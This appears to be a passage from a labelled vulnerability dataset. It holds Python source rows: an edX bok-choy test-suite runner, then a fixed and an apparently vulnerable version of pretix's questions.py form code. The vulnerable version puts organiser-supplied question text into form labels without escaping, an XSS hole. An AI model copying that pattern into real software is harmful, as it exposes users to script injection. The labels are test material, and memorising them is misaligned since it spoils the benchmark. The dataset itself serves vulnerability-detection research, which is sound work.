      serversonly - prepare and run the necessary servers, only stopping when interrupted with Ctrl-C
      testsonly - assume servers are running (as per above) and run tests with no setup or cleaning of environment
      test_spec - when set, specifies test files, classes, cases, etc. See platform doc.
      default_store - modulestore to use when running tests (split or draft)
      num_processes - number of processes or threads to use in tests. Recommendation is that this
      is less than or equal to the number of available processors.
      verify_xss - when set, check for XSS vulnerabilities in the page HTML.
      See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html
    """"""
    def __init__(self, *args, **kwargs):
        super(BokChoyTestSuite, self).__init__(*args, **kwargs)
        self.test_dir = Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests')
        self.log_dir = Env.BOK_CHOY_LOG_DIR
        self.report_dir = kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR)
        self.xunit_report = self.report_dir / ""xunit.xml""
        self.cache = Env.BOK_CHOY_CACHE
        self.fasttest = kwargs.get('fasttest', False)
        self.serversonly = kwargs.get('serversonly', False)
        self.testsonly = kwargs.get('testsonly', False)
        self.test_spec = kwargs.get('test_spec', None)
        self.default_store = kwargs.get('default_store', None)
        self.verbosity = kwargs.get('verbosity', DEFAULT_VERBOSITY)
        self.num_processes = kwargs.get('num_processes', DEFAULT_NUM_PROCESSES)
        self.verify_xss = kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False))
        self.extra_args = kwargs.get('extra_args', '')
        self.har_dir = self.log_dir / 'hars'
        self.a11y_file = Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE
        self.imports_dir = kwargs.get('imports_dir', None)
        self.coveragerc = kwargs.get('coveragerc', None)
        self.save_screenshots = kwargs.get('save_screenshots', False)

    def __enter__(self):
        super(BokChoyTestSuite, self).__enter__()

        # Ensure that we have a directory to put logs and reports
        self.log_dir.makedirs_p()
        self.har_dir.makedirs_p()
        self.report_dir.makedirs_p()
        test_utils.clean_reports_dir()      # pylint: disable=no-value-for-parameter

        if not (self.fasttest or self.skip_clean or self.testsonly):
            test_utils.clean_test_files()

        msg = colorize('green', ""Checking for mongo, memchache, and mysql..."")
        print msg
        bokchoy_utils.check_services()

        if not self.testsonly:
            self.prepare_bokchoy_run()
        else:
            # load data in db_fixtures
            self.load_data()

        msg = colorize('green', ""Confirming servers have started..."")
        print msg
        bokchoy_utils.wait_for_test_servers()
        try:
            # Create course in order to seed forum data underneath. This is
            # a workaround for a race condition. The first time a course is created;
            # role permissions are set up for forums.
            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()
            print 'Forums permissions/roles data has been seeded'
        except FixtureError:
            # this means it's already been done
            pass

        if self.serversonly:
            self.run_servers_continuously()

    def __exit__(self, exc_type, exc_value, traceback):
        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)

        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)
        if self.testsonly:
            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')
            print msg
        else:
            # Clean up data we created in the databases
            msg = colorize('green', ""Cleaning up databases..."")
            print msg
            sh(""./manage.py lms --settings bok_choy flush --traceback --noinput"")
            bokchoy_utils.clear_mongo()

    def verbosity_processes_string(self):
        """"""
        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct
        the proper combination for use with nosetests.
        """"""
        substring = []

        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:
            msg = 'Cannot pass in both num_processors and verbosity. Quitting'
            raise BuildFailure(msg)

        if self.num_processes != 1:
            # Construct ""multiprocess"" nosetest substring
            substring = [
                ""--with-xunitmp --xunitmp-file={}"".format(self.xunit_report),
                ""--processes={}"".format(self.num_processes),
                ""--no-color --process-timeout=1200""
            ]

        else:
            substring = [
                ""--with-xunit"",
                ""--xunit-file={}"".format(self.xunit_report),
                ""--verbosity={}"".format(self.verbosity),
            ]

        return "" "".join(substring)

    def prepare_bokchoy_run(self):
        """"""
        Sets up and starts servers for a Bok Choy run. If --fasttest is not
        specified then static assets are collected
        """"""
        sh(""{}/scripts/reset-test-db.sh"".format(Env.REPO_ROOT))

        if not self.fasttest:
            self.generate_optimized_static_assets()

        # Clear any test data already in Mongo or MySQLand invalidate
        # the cache
        bokchoy_utils.clear_mongo()
        self.cache.flush_all()

        # load data in db_fixtures
        self.load_data()

        # load courses if self.imports_dir is set
        self.load_courses()

        # Ensure the test servers are available
        msg = colorize('green', ""Confirming servers are running..."")
        print msg
        bokchoy_utils.start_servers(self.default_store, self.coveragerc)

    def load_courses(self):
        """"""
        Loads courses from self.imports_dir.

        Note: self.imports_dir is the directory that contains the directories
        that have courses in them. For example, if the course is located in
        `test_root/courses/test-example-course/`, self.imports_dir should be
        `test_root/courses/`.
        """"""
        msg = colorize('green', ""Importing courses from {}..."".format(self.imports_dir))
        print msg

        if self.imports_dir:
            sh(
                ""DEFAULT_STORE={default_store}""
                "" ./manage.py cms --settings=bok_choy import {import_dir}"".format(
                    default_store=self.default_store,
                    import_dir=self.imports_dir
                )
            )

    def load_data(self):
        """"""
        Loads data into database from db_fixtures
        """"""
        print 'Loading data from json fixtures in db_fixtures directory'
        sh(
            ""DEFAULT_STORE={default_store}""
            "" ./manage.py lms --settings bok_choy loaddata --traceback""
            "" common/test/db_fixtures/*.json"".format(
                default_store=self.default_store,
            )
        )

    def run_servers_continuously(self):
        """"""
        Infinite loop. Servers will continue to run in the current session unless interrupted.
        """"""
        print 'Bok-choy servers running. Press Ctrl-C to exit...\n'
        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\n'

        while True:
            try:
                sleep(10000)
            except KeyboardInterrupt:
                print ""Stopping bok-choy servers.\n""
                break

    @property
    def cmd(self):
        """"""
        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,
         the command returns an empty string.
        """"""
        # Default to running all tests if no specific test is specified
        if not self.test_spec:
            test_spec = self.test_dir
        else:
            test_spec = self.test_dir / self.test_spec

        # Skip any additional commands (such as nosetests) if running in
        # servers only mode
        if self.serversonly:
            return """"

        # Construct the nosetests command, specifying where to save
        # screenshots and XUnit XML reports
        cmd = [
            ""DEFAULT_STORE={}"".format(self.default_store),
            ""SCREENSHOT_DIR='{}'"".format(self.log_dir),
            ""BOK_CHOY_HAR_DIR='{}'"".format(self.har_dir),
            ""BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'"".format(self.a11y_file),
            ""SELENIUM_DRIVER_LOG_DIR='{}'"".format(self.log_dir),
            ""VERIFY_XSS='{}'"".format(self.verify_xss),
            ""nosetests"",
            test_spec,
            ""{}"".format(self.verbosity_processes_string())
        ]
        if self.pdb:
            cmd.append(""--pdb"")
        if self.save_screenshots:
            cmd.append(""--with-save-baseline"")
        cmd.append(self.extra_args)

        cmd = ("" "").join(cmd)
        return cmd


class Pa11yCrawler(BokChoyTestSuite):
    """"""
    Sets up test environment with mega-course loaded, and runs pa11ycralwer
    against it.
    """"""

    def __init__(self, *args, **kwargs):
        super(Pa11yCrawler, self).__init__(*args, **kwargs)
        self.course_key = kwargs.get('course_key')
        if self.imports_dir:
            # If imports_dir has been specified, assume the files are
            # already there -- no need to fetch them from github. This
            # allows someome to crawl a different course. They are responsible
            # for putting it, un-archived, in the directory.
            self.should_fetch_course = False
        else:
            # Otherwise, obey `--skip-fetch` command and use the default
            # test course.  Note that the fetch will also be skipped when
            # using `--fast`.
            self.should_fetch_course = kwargs.get('should_fetch_course')
            self.imports_dir = path('test_root/courses/')

        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')
        self.tar_gz_file = ""https://github.com/edx/demo-test-course/archive/master.tar.gz""

        self.start_urls = []
        auto_auth_params = {
            ""redirect"": 'true',
            ""staff"": 'true',
            ""course_id"": self.course_key,
        }
        cms_params = urlencode(auto_auth_params)
        self.start_urls.append(""\""http://localhost:8031/auto_auth?{}\"""".format(cms_params))

        sequence_url = ""/api/courses/v1/blocks/?{}"".format(
            urlencode({
                ""course_id"": self.course_key,
                ""depth"": ""all"",
                ""all_blocks"": ""true"",
            })
        )
        auto_auth_params.update({'redirect_to': sequence_url})
        lms_params = urlencode(auto_auth_params)
        self.start_urls.append(""\""http://localhost:8003/auto_auth?{}\"""".format(lms_params))

    def __enter__(self):
        if self.should_fetch_course:
            self.get_test_course()
        super(Pa11yCrawler, self).__enter__()

    def get_test_course(self):
        """"""
        Fetches the test course.
        """"""
        self.imports_dir.makedirs_p()
        zipped_course = self.imports_dir + 'demo_course.tar.gz'

        msg = colorize('green', ""Fetching the test course from github..."")
        print msg

        sh(
            'wget {tar_gz_file} -O {zipped_course}'.format(
                tar_gz_file=self.tar_gz_file,
                zipped_course=zipped_course,
            )
        )

        msg = colorize('green', ""Uncompressing the test course..."")
        print msg

        sh(
            'tar zxf {zipped_course} -C {courses_dir}'.format(
                zipped_course=zipped_course,
                courses_dir=self.imports_dir,
            )
        )

    def generate_html_reports(self):
        """"""
        Runs pa11ycrawler json-to-html
        """"""
        cmd_str = (
            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'
        ).format(report_dir=self.pa11y_report_dir)

        sh(cmd_str)

    @property
    def cmd(self):
        """"""
        Runs pa11ycrawler as staff user against the test course.
        """"""
        cmd_str = (
            'pa11ycrawler run {start_urls} '
            '--pa11ycrawler-allowed-domains={allowed_domains} '
            '--pa11ycrawler-reports-dir={report_dir} '
            '--pa11ycrawler-deny-url-matcher={dont_go_here} '
            '--pa11y-reporter=""{reporter}"" '
            '--depth-limit={depth} '
        ).format(
            start_urls=' '.join(self.start_urls),
            allowed_domains='localhost',
            report_dir=self.pa11y_report_dir,
            reporter=""1.0-json"",
            dont_go_here=""logout"",
            depth=""6"",
        )
        return cmd_str
/n/n/n",1
50,affc6254a8316643d4afe9e8b7f8cd288c86ca1f,"src/pretix/base/forms/questions.py/n/nimport copy
import logging
from decimal import Decimal

import dateutil.parser
import pytz
import vat_moss.errors
import vat_moss.id
from django import forms
from django.contrib import messages
from django.core.exceptions import ValidationError
from django.utils.html import escape
from django.utils.safestring import mark_safe
from django.utils.translation import ugettext_lazy as _

from pretix.base.forms.widgets import (
    BusinessBooleanRadio, DatePickerWidget, SplitDateTimePickerWidget,
    TimePickerWidget, UploadedFileWidget,
)
from pretix.base.models import InvoiceAddress, Question
from pretix.base.models.tax import EU_COUNTRIES
from pretix.base.settings import PERSON_NAME_SCHEMES
from pretix.base.templatetags.rich_text import rich_text
from pretix.control.forms import SplitDateTimeField
from pretix.helpers.i18n import get_format_without_seconds
from pretix.presale.signals import question_form_fields

logger = logging.getLogger(__name__)


class NamePartsWidget(forms.MultiWidget):
    widget = forms.TextInput

    def __init__(self, scheme: dict, field: forms.Field, attrs=None):
        widgets = []
        self.scheme = scheme
        self.field = field
        for fname, label, size in self.scheme['fields']:
            a = copy.copy(attrs) or {}
            a['data-fname'] = fname
            widgets.append(self.widget(attrs=a))
        super().__init__(widgets, attrs)

    def decompress(self, value):
        if value is None:
            return None
        data = []
        for i, field in enumerate(self.scheme['fields']):
            fname, label, size = field
            data.append(value.get(fname, """"))
        if '_legacy' in value and not data[-1]:
            data[-1] = value.get('_legacy', '')
        return data

    def render(self, name: str, value, attrs=None, renderer=None) -> str:
        if not isinstance(value, list):
            value = self.decompress(value)
        output = []
        final_attrs = self.build_attrs(attrs or dict())
        if 'required' in final_attrs:
            del final_attrs['required']
        id_ = final_attrs.get('id', None)
        for i, widget in enumerate(self.widgets):
            try:
                widget_value = value[i]
            except (IndexError, TypeError):
                widget_value = None
            if id_:
                final_attrs = dict(
                    final_attrs,
                    id='%s_%s' % (id_, i),
                    title=self.scheme['fields'][i][1],
                    placeholder=self.scheme['fields'][i][1],
                )
                final_attrs['data-size'] = self.scheme['fields'][i][2]
            output.append(widget.render(name + '_%s' % i, widget_value, final_attrs, renderer=renderer))
        return mark_safe(self.format_output(output))

    def format_output(self, rendered_widgets) -> str:
        return '<div class=""nameparts-form-group"">%s</div>' % ''.join(rendered_widgets)


class NamePartsFormField(forms.MultiValueField):
    widget = NamePartsWidget

    def compress(self, data_list) -> dict:
        data = {}
        data['_scheme'] = self.scheme_name
        for i, value in enumerate(data_list):
            data[self.scheme['fields'][i][0]] = value or ''
        return data

    def __init__(self, *args, **kwargs):
        fields = []
        defaults = {
            'widget': self.widget,
            'max_length': kwargs.pop('max_length', None),
        }
        self.scheme_name = kwargs.pop('scheme')
        self.scheme = PERSON_NAME_SCHEMES.get(self.scheme_name)
        self.one_required = kwargs.get('required', True)
        require_all_fields = kwargs.pop('require_all_fields', False)
        kwargs['required'] = False
        kwargs['widget'] = (kwargs.get('widget') or self.widget)(
            scheme=self.scheme, field=self, **kwargs.pop('widget_kwargs', {})
        )
        defaults.update(**kwargs)
        for fname, label, size in self.scheme['fields']:
            defaults['label'] = label
            field = forms.CharField(**defaults)
            field.part_name = fname
            fields.append(field)
        super().__init__(
            fields=fields, require_all_fields=False, *args, **kwargs
        )
        self.require_all_fields = require_all_fields
        self.required = self.one_required

    def clean(self, value) -> dict:
        value = super().clean(value)
        if self.one_required and (not value or not any(v for v in value)):
            raise forms.ValidationError(self.error_messages['required'], code='required')
        if self.require_all_fields and not all(v for v in value):
            raise forms.ValidationError(self.error_messages['incomplete'], code='required')
        return value


class BaseQuestionsForm(forms.Form):
    """"""
    This form class is responsible for asking order-related questions. This includes
    the attendee name for admission tickets, if the corresponding setting is enabled,
    as well as additional questions defined by the organizer.
    """"""

    def __init__(self, *args, **kwargs):
        """"""
        Takes two additional keyword arguments:

        :param cartpos: The cart position the form should be for
        :param event: The event this belongs to
        """"""
        cartpos = self.cartpos = kwargs.pop('cartpos', None)
        orderpos = self.orderpos = kwargs.pop('orderpos', None)
        pos = cartpos or orderpos
        item = pos.item
        questions = pos.item.questions_to_ask
        event = kwargs.pop('event')

        super().__init__(*args, **kwargs)

        if item.admission and event.settings.attendee_names_asked:
            self.fields['attendee_name_parts'] = NamePartsFormField(
                max_length=255,
                required=event.settings.attendee_names_required,
                scheme=event.settings.name_scheme,
                label=_('Attendee name'),
                initial=(cartpos.attendee_name_parts if cartpos else orderpos.attendee_name_parts),
            )
        if item.admission and event.settings.attendee_emails_asked:
            self.fields['attendee_email'] = forms.EmailField(
                required=event.settings.attendee_emails_required,
                label=_('Attendee email'),
                initial=(cartpos.attendee_email if cartpos else orderpos.attendee_email)
            )

        for q in questions:
            # Do we already have an answer? Provide it as the initial value
            answers = [a for a in pos.answerlist if a.question_id == q.id]
            if answers:
                initial = answers[0]
            else:
                initial = None
            tz = pytz.timezone(event.settings.timezone)
            help_text = rich_text(q.help_text)
            label = escape(q.question)  # django-bootstrap3 calls mark_safe
            if q.type == Question.TYPE_BOOLEAN:
                if q.required:
                    # For some reason, django-bootstrap3 does not set the required attribute
                    # itself.
                    widget = forms.CheckboxInput(attrs={'required': 'required'})
                else:
                    widget = forms.CheckboxInput()

                if initial:
                    initialbool = (initial.answer == ""True"")
                else:
                    initialbool = False

                field = forms.BooleanField(
                    label=label, required=q.required,
                    help_text=help_text,
                    initial=initialbool, widget=widget,
                )
            elif q.type == Question.TYPE_NUMBER:
                field = forms.DecimalField(
                    label=label, required=q.required,
                    help_text=q.help_text,
                    initial=initial.answer if initial else None,
                    min_value=Decimal('0.00'),
                )
            elif q.type == Question.TYPE_STRING:
                field = forms.CharField(
                    label=label, required=q.required,
                    help_text=help_text,
                    initial=initial.answer if initial else None,
                )
            elif q.type == Question.TYPE_TEXT:
                field = forms.CharField(
                    label=label, required=q.required,
                    help_text=help_text,
                    widget=forms.Textarea,
                    initial=initial.answer if initial else None,
                )
            elif q.type == Question.TYPE_CHOICE:
                field = forms.ModelChoiceField(
                    queryset=q.options,
                    label=label, required=q.required,
                    help_text=help_text,
                    widget=forms.Select,
                    empty_label='',
                    initial=initial.options.first() if initial else None,
                )
            elif q.type == Question.TYPE_CHOICE_MULTIPLE:
                field = forms.ModelMultipleChoiceField(
                    queryset=q.options,
                    label=label, required=q.required,
                    help_text=help_text,
                    widget=forms.CheckboxSelectMultiple,
                    initial=initial.options.all() if initial else None,
                )
            elif q.type == Question.TYPE_FILE:
                field = forms.FileField(
                    label=label, required=q.required,
                    help_text=help_text,
                    initial=initial.file if initial else None,
                    widget=UploadedFileWidget(position=pos, event=event, answer=initial),
                )
            elif q.type == Question.TYPE_DATE:
                field = forms.DateField(
                    label=label, required=q.required,
                    help_text=help_text,
                    initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None,
                    widget=DatePickerWidget(),
                )
            elif q.type == Question.TYPE_TIME:
                field = forms.TimeField(
                    label=label, required=q.required,
                    help_text=help_text,
                    initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None,
                    widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),
                )
            elif q.type == Question.TYPE_DATETIME:
                field = SplitDateTimeField(
                    label=label, required=q.required,
                    help_text=help_text,
                    initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None,
                    widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),
                )
            field.question = q
            if answers:
                # Cache the answer object for later use
                field.answer = answers[0]
            self.fields['question_%s' % q.id] = field

        responses = question_form_fields.send(sender=event, position=pos)
        data = pos.meta_info_data
        for r, response in sorted(responses, key=lambda r: str(r[0])):
            for key, value in response.items():
                # We need to be this explicit, since OrderedDict.update does not retain ordering
                self.fields[key] = value
                value.initial = data.get('question_form_data', {}).get(key)


class BaseInvoiceAddressForm(forms.ModelForm):
    vat_warning = False

    class Meta:
        model = InvoiceAddress
        fields = ('is_business', 'company', 'name_parts', 'street', 'zipcode', 'city', 'country', 'vat_id',
                  'internal_reference', 'beneficiary')
        widgets = {
            'is_business': BusinessBooleanRadio,
            'street': forms.Textarea(attrs={'rows': 2, 'placeholder': _('Street and Number')}),
            'beneficiary': forms.Textarea(attrs={'rows': 3}),
            'company': forms.TextInput(attrs={'data-display-dependency': '#id_is_business_1'}),
            'vat_id': forms.TextInput(attrs={'data-display-dependency': '#id_is_business_1'}),
            'internal_reference': forms.TextInput,
        }
        labels = {
            'is_business': ''
        }

    def __init__(self, *args, **kwargs):
        self.event = event = kwargs.pop('event')
        self.request = kwargs.pop('request', None)
        self.validate_vat_id = kwargs.pop('validate_vat_id')
        self.all_optional = kwargs.pop('all_optional', False)
        super().__init__(*args, **kwargs)
        if not event.settings.invoice_address_vatid:
            del self.fields['vat_id']

        if not event.settings.invoice_address_required or self.all_optional:
            for k, f in self.fields.items():
                f.required = False
                f.widget.is_required = False
                if 'required' in f.widget.attrs:
                    del f.widget.attrs['required']
        elif event.settings.invoice_address_company_required and not self.all_optional:
            self.initial['is_business'] = True

            self.fields['is_business'].widget = BusinessBooleanRadio(require_business=True)
            self.fields['company'].required = True
            self.fields['company'].widget.is_required = True
            self.fields['company'].widget.attrs['required'] = 'required'
            del self.fields['company'].widget.attrs['data-display-dependency']
            if 'vat_id' in self.fields:
                del self.fields['vat_id'].widget.attrs['data-display-dependency']

        self.fields['name_parts'] = NamePartsFormField(
            max_length=255,
            required=event.settings.invoice_name_required and not self.all_optional,
            scheme=event.settings.name_scheme,
            label=_('Name'),
            initial=(self.instance.name_parts if self.instance else self.instance.name_parts),
        )
        if event.settings.invoice_address_required and not event.settings.invoice_address_company_required and not self.all_optional:
            self.fields['name_parts'].widget.attrs['data-required-if'] = '#id_is_business_0'
            self.fields['name_parts'].widget.attrs['data-no-required-attr'] = '1'
            self.fields['company'].widget.attrs['data-required-if'] = '#id_is_business_1'

        if not event.settings.invoice_address_beneficiary:
            del self.fields['beneficiary']

    def clean(self):
        data = self.cleaned_data
        if not data.get('is_business'):
            data['company'] = ''
        if self.event.settings.invoice_address_required:
            if data.get('is_business') and not data.get('company'):
                raise ValidationError(_('You need to provide a company name.'))
            if not data.get('is_business') and not data.get('name_parts'):
                raise ValidationError(_('You need to provide your name.'))

        if 'vat_id' in self.changed_data or not data.get('vat_id'):
            self.instance.vat_id_validated = False

        self.instance.name_parts = data.get('name_parts')

        if self.validate_vat_id and self.instance.vat_id_validated and 'vat_id' not in self.changed_data:
            pass
        elif self.validate_vat_id and data.get('is_business') and data.get('country') in EU_COUNTRIES and data.get('vat_id'):
            if data.get('vat_id')[:2] != str(data.get('country')):
                raise ValidationError(_('Your VAT ID does not match the selected country.'))
            try:
                result = vat_moss.id.validate(data.get('vat_id'))
                if result:
                    country_code, normalized_id, company_name = result
                    self.instance.vat_id_validated = True
                    self.instance.vat_id = normalized_id
            except (vat_moss.errors.InvalidError, ValueError):
                raise ValidationError(_('This VAT ID is not valid. Please re-check your input.'))
            except vat_moss.errors.WebServiceUnavailableError:
                logger.exception('VAT ID checking failed for country {}'.format(data.get('country')))
                self.instance.vat_id_validated = False
                if self.request and self.vat_warning:
                    messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of '
                                                     'your country is currently not available. We will therefore '
                                                     'need to charge VAT on your invoice. You can get the tax amount '
                                                     'back via the VAT reimbursement process.'))
            except vat_moss.errors.WebServiceError:
                logger.exception('VAT ID checking failed for country {}'.format(data.get('country')))
                self.instance.vat_id_validated = False
                if self.request and self.vat_warning:
                    messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of '
                                                     'your country returned an incorrect result. We will therefore '
                                                     'need to charge VAT on your invoice. Please contact support to '
                                                     'resolve this manually.'))
        else:
            self.instance.vat_id_validated = False


class BaseInvoiceNameForm(BaseInvoiceAddressForm):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        for f in list(self.fields.keys()):
            if f != 'name':
                del self.fields[f]
/n/n/n",0
51,affc6254a8316643d4afe9e8b7f8cd288c86ca1f,"/src/pretix/base/forms/questions.py/n/nimport copy
import logging
from decimal import Decimal

import dateutil.parser
import pytz
import vat_moss.errors
import vat_moss.id
from django import forms
from django.contrib import messages
from django.core.exceptions import ValidationError
from django.utils.safestring import mark_safe
from django.utils.translation import ugettext_lazy as _

from pretix.base.forms.widgets import (
    BusinessBooleanRadio, DatePickerWidget, SplitDateTimePickerWidget,
    TimePickerWidget, UploadedFileWidget,
)
from pretix.base.models import InvoiceAddress, Question
from pretix.base.models.tax import EU_COUNTRIES
from pretix.base.settings import PERSON_NAME_SCHEMES
from pretix.base.templatetags.rich_text import rich_text
from pretix.control.forms import SplitDateTimeField
from pretix.helpers.i18n import get_format_without_seconds
from pretix.presale.signals import question_form_fields

logger = logging.getLogger(__name__)


class NamePartsWidget(forms.MultiWidget):
    widget = forms.TextInput

    def __init__(self, scheme: dict, field: forms.Field, attrs=None):
        widgets = []
        self.scheme = scheme
        self.field = field
        for fname, label, size in self.scheme['fields']:
            a = copy.copy(attrs) or {}
            a['data-fname'] = fname
            widgets.append(self.widget(attrs=a))
        super().__init__(widgets, attrs)

    def decompress(self, value):
        if value is None:
            return None
        data = []
        for i, field in enumerate(self.scheme['fields']):
            fname, label, size = field
            data.append(value.get(fname, """"))
        if '_legacy' in value and not data[-1]:
            data[-1] = value.get('_legacy', '')
        return data

    def render(self, name: str, value, attrs=None, renderer=None) -> str:
        if not isinstance(value, list):
            value = self.decompress(value)
        output = []
        final_attrs = self.build_attrs(attrs or dict())
        if 'required' in final_attrs:
            del final_attrs['required']
        id_ = final_attrs.get('id', None)
        for i, widget in enumerate(self.widgets):
            try:
                widget_value = value[i]
            except (IndexError, TypeError):
                widget_value = None
            if id_:
                final_attrs = dict(
                    final_attrs,
                    id='%s_%s' % (id_, i),
                    title=self.scheme['fields'][i][1],
                    placeholder=self.scheme['fields'][i][1],
                )
                final_attrs['data-size'] = self.scheme['fields'][i][2]
            output.append(widget.render(name + '_%s' % i, widget_value, final_attrs, renderer=renderer))
        return mark_safe(self.format_output(output))

    def format_output(self, rendered_widgets) -> str:
        return '<div class=""nameparts-form-group"">%s</div>' % ''.join(rendered_widgets)


class NamePartsFormField(forms.MultiValueField):
    widget = NamePartsWidget

    def compress(self, data_list) -> dict:
        data = {}
        data['_scheme'] = self.scheme_name
        for i, value in enumerate(data_list):
            data[self.scheme['fields'][i][0]] = value or ''
        return data

    def __init__(self, *args, **kwargs):
        fields = []
        defaults = {
            'widget': self.widget,
            'max_length': kwargs.pop('max_length', None),
        }
        self.scheme_name = kwargs.pop('scheme')
        self.scheme = PERSON_NAME_SCHEMES.get(self.scheme_name)
        self.one_required = kwargs.get('required', True)
        require_all_fields = kwargs.pop('require_all_fields', False)
        kwargs['required'] = False
        kwargs['widget'] = (kwargs.get('widget') or self.widget)(
            scheme=self.scheme, field=self, **kwargs.pop('widget_kwargs', {})
        )
        defaults.update(**kwargs)
        for fname, label, size in self.scheme['fields']:
            defaults['label'] = label
            field = forms.CharField(**defaults)
            field.part_name = fname
            fields.append(field)
        super().__init__(
            fields=fields, require_all_fields=False, *args, **kwargs
        )
        self.require_all_fields = require_all_fields
        self.required = self.one_required

    def clean(self, value) -> dict:
        value = super().clean(value)
        if self.one_required and (not value or not any(v for v in value)):
            raise forms.ValidationError(self.error_messages['required'], code='required')
        if self.require_all_fields and not all(v for v in value):
            raise forms.ValidationError(self.error_messages['incomplete'], code='required')
        return value


class BaseQuestionsForm(forms.Form):
    """"""
    This form class is responsible for asking order-related questions. This includes
    the attendee name for admission tickets, if the corresponding setting is enabled,
    as well as additional questions defined by the organizer.
    """"""

    def __init__(self, *args, **kwargs):
        """"""
        Takes two additional keyword arguments:

        :param cartpos: The cart position the form should be for
        :param event: The event this belongs to
        """"""
        cartpos = self.cartpos = kwargs.pop('cartpos', None)
        orderpos = self.orderpos = kwargs.pop('orderpos', None)
        pos = cartpos or orderpos
        item = pos.item
        questions = pos.item.questions_to_ask
        event = kwargs.pop('event')

        super().__init__(*args, **kwargs)

        if item.admission and event.settings.attendee_names_asked:
            self.fields['attendee_name_parts'] = NamePartsFormField(
                max_length=255,
                required=event.settings.attendee_names_required,
                scheme=event.settings.name_scheme,
                label=_('Attendee name'),
                initial=(cartpos.attendee_name_parts if cartpos else orderpos.attendee_name_parts),
            )
        if item.admission and event.settings.attendee_emails_asked:
            self.fields['attendee_email'] = forms.EmailField(
                required=event.settings.attendee_emails_required,
                label=_('Attendee email'),
                initial=(cartpos.attendee_email if cartpos else orderpos.attendee_email)
            )

        for q in questions:
            # Do we already have an answer? Provide it as the initial value
            answers = [a for a in pos.answerlist if a.question_id == q.id]
            if answers:
                initial = answers[0]
            else:
                initial = None
            tz = pytz.timezone(event.settings.timezone)
            help_text = rich_text(q.help_text)
            if q.type == Question.TYPE_BOOLEAN:
                if q.required:
                    # For some reason, django-bootstrap3 does not set the required attribute
                    # itself.
                    widget = forms.CheckboxInput(attrs={'required': 'required'})
                else:
                    widget = forms.CheckboxInput()

                if initial:
                    initialbool = (initial.answer == ""True"")
                else:
                    initialbool = False

                field = forms.BooleanField(
                    label=q.question, required=q.required,
                    help_text=help_text,
                    initial=initialbool, widget=widget,
                )
            elif q.type == Question.TYPE_NUMBER:
                field = forms.DecimalField(
                    label=q.question, required=q.required,
                    help_text=q.help_text,
                    initial=initial.answer if initial else None,
                    min_value=Decimal('0.00'),
                )
            elif q.type == Question.TYPE_STRING:
                field = forms.CharField(
                    label=q.question, required=q.required,
                    help_text=help_text,
                    initial=initial.answer if initial else None,
                )
            elif q.type == Question.TYPE_TEXT:
                field = forms.CharField(
                    label=q.question, required=q.required,
                    help_text=help_text,
                    widget=forms.Textarea,
                    initial=initial.answer if initial else None,
                )
            elif q.type == Question.TYPE_CHOICE:
                field = forms.ModelChoiceField(
                    queryset=q.options,
                    label=q.question, required=q.required,
                    help_text=help_text,
                    widget=forms.Select,
                    empty_label='',
                    initial=initial.options.first() if initial else None,
                )
            elif q.type == Question.TYPE_CHOICE_MULTIPLE:
                field = forms.ModelMultipleChoiceField(
                    queryset=q.options,
                    label=q.question, required=q.required,
                    help_text=help_text,
                    widget=forms.CheckboxSelectMultiple,
                    initial=initial.options.all() if initial else None,
                )
            elif q.type == Question.TYPE_FILE:
                field = forms.FileField(
                    label=q.question, required=q.required,
                    help_text=help_text,
                    initial=initial.file if initial else None,
                    widget=UploadedFileWidget(position=pos, event=event, answer=initial),
                )
            elif q.type == Question.TYPE_DATE:
                field = forms.DateField(
                    label=q.question, required=q.required,
                    help_text=help_text,
                    initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None,
                    widget=DatePickerWidget(),
                )
            elif q.type == Question.TYPE_TIME:
                field = forms.TimeField(
                    label=q.question, required=q.required,
                    help_text=help_text,
                    initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None,
                    widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),
                )
            elif q.type == Question.TYPE_DATETIME:
                field = SplitDateTimeField(
                    label=q.question, required=q.required,
                    help_text=help_text,
                    initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None,
                    widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),
                )
            field.question = q
            if answers:
                # Cache the answer object for later use
                field.answer = answers[0]
            self.fields['question_%s' % q.id] = field

        responses = question_form_fields.send(sender=event, position=pos)
        data = pos.meta_info_data
        for r, response in sorted(responses, key=lambda r: str(r[0])):
            for key, value in response.items():
                # We need to be this explicit, since OrderedDict.update does not retain ordering
                self.fields[key] = value
                value.initial = data.get('question_form_data', {}).get(key)


class BaseInvoiceAddressForm(forms.ModelForm):
    vat_warning = False

    class Meta:
        model = InvoiceAddress
        fields = ('is_business', 'company', 'name_parts', 'street', 'zipcode', 'city', 'country', 'vat_id',
                  'internal_reference', 'beneficiary')
        widgets = {
            'is_business': BusinessBooleanRadio,
            'street': forms.Textarea(attrs={'rows': 2, 'placeholder': _('Street and Number')}),
            'beneficiary': forms.Textarea(attrs={'rows': 3}),
